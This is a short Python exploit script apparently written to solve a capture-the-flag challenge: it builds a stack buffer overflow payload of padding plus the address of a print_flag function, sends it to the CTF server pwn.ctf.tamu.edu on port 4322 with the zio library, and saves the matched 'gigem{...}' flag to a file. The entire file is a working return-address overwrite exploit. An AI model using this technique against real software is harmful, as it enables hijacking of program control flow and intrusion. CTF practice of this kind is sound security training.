# https://ctftime.org/task/5396
from zio import *
import re

flag_pattern = r"gigem{.+?}"

off_s = -0xEF
off_ret = 4
junk = 'a'
fun_addr_print_flag = 0x0804854B

payload = (off_ret - off_s) * junk + l32(fun_addr_print_flag)

server = "pwn.ctf.tamu.edu", 4322
io = zio(server, print_read=False, print_write=False)
io.writeline(payload)
content = io.read_until_re(flag_pattern)
flag = re.search(flag_pattern, content).group()

with open('flag', 'wb') as f:
	f.write(flag)
